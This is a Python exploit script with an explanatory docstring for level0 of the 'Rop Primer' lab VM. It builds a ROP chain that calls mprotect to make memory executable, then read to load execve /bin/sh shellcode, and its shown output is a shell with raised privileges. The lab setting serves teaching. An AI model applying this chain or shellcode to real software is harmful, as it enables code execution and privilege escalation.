#!/usr/bin/env python

"""

This challenge is part of Rop Primer (https://www.vulnhub.com/entry/rop-primer-02,114/).

To exploit level0 you have to make executable the stack segment in order to inject your shellcode and read the flag.

So, there is no ASLR and we are into a x86 system:

uname -a
    Linux rop 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux

cat /proc/sys/kernel/randomize_va_space
	0

By starting the binary analysis we can see that there is NX protection only

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled

and we can trigger our overflow after sending 44 bytes of junk.

System()) is not loaded:
gdb-peda$ p system
    No symbol table is loaded.  Use the "file" command.

but we can find mprotect():

gdb-peda$ p mprotect
    $1 = {<text variable, no debug info>} 0x80523e0 <mprotect>

By reading the manual we can understand the mprotect() behavior and the parameter that this function will accept.

SYNOPSIS
    #include <sys/mman.h>
    int mprotect(void *addr, size_t len, int prot);

DESCRIPTION
       mprotect() changes protection for the calling process's memory page(s) containing any part of the address range
       in the interval [addr, addr+len-1].  addr must be aligned to a page boundary.

So now we need to know the start of the memory address that we want to change the protection to rwx.

gdb-peda$ vmmap
	Start      End        Perm	Name
	0x08048000 0x080ca000 r-xp	/home/level0/level0
	0x080ca000 0x080cb000 rw-p	/home/level0/level0
	0x080cb000 0x080ef000 rw-p	[heap]
	0xb7fff000 0xb8000000 r-xp	[vdso]
	0xbffdf000 0xc0000000 rw-p	[stack]

now --> 0x080ca000 0x080cb000 rwxp	/home/level0/level0

After this first stage we have to inject our shellcode to execute that will be 
\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80
from https://packetstormsecurity.com/files/147512/Linux-x86-execve-bin-sh-Shellcode.html

Also we have to call the read() function in order to read our shellcode from the stdin.
Let's get our ropgadget to call the function after making stack segment executable.

gdb-peda$ ropgadget 
    ret = 0x8048106
    addesp_4 = 0x804a278
    popret = 0x8048550
    pop2ret = 0x8048883
	pop4ret = 0x8048881
	pop3ret = 0x8048882 # we need this.

gdb-peda$ p read
	$1 = {<text variable, no debug info>} 0x80517f0 <read>

man read
    ssize_t read(int fd, void *buf, size_t count);

level0@rop:~$ (python exploit.py ; python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"' ; cat) | ./level0
	[+] ROP tutorial level0
	[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
	id
	uid=1000(level0) gid=1000(level0) euid=1001(level1) groups=1001(level1),1000(level0)

"""

import struct


def p32(address):
	return struct.pack("<L", address)



mprotect = p32(0x80523e0)
read = p32(0x80517f0)

stack_start_address = p32(0x080ca000)
buffer_length = p32(0x1000)
stack_permission = p32(0x7) #rwx
pop3ret = p32(0x8048882)

shellcode = "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"

# First stage: stack executable
## junk + mprotect + pop3ret + stack_start_address + buffer_length + stack_permission

buf = ""
buf += "A" * 44
buf += mprotect
buf += pop3ret
buf += stack_start_address
buf += buffer_length
buf += stack_permission

# Second stage: read from stdin the shellcode

buf += read
buf += stack_start_address
buf += p32(0x0)
buf += stack_start_address
buf += buffer_length


print buf

